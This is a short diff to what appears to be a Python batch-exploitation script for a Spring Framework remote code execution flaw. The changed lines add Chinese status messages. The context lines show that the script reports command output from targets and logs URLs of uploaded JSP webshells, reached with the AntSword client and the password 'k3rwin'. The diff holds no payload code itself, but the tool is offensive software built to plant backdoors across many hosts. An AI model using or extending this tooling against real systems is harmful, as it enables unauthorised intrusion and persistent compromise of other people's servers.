@@ -65,6 +65,8 @@ def exp(url, system):
                 resp = r.text
                 result = re.findall('([^\x00]+)\n', resp)[0]
                 print(Fore.GREEN + result)
+        else:
+            print(Fore.RED + "[-]" + url + " 漏洞不存在或者已经被利用,shell地址自行扫描\n")
     except KeyboardInterrupt:
         print("ctrl + c 终止进程")
     except Exception as e:
@@ -94,7 +96,7 @@ def exps(file):
                 if test.status_code == 200:
                     f2.write("[+]Spring框架存在RCE漏洞，上传木马地址为：" + url + "/{}.jsp".format(shell_name) + " 使用蚁剑进行连接，密码为k3rwin\n")
                 else:
-                    f2.write("[-]" + url + " 漏洞不存在或者已经被利用\n")
+                    f2.write("[-]" + url + " 漏洞不存在或者已经被利用，shell地址自行扫描\n")
             except Exception as e:
                 print(e)
         print(Fore.GREEN + "[*]批量测试结果保存在当前目录下的result.txt文件内")
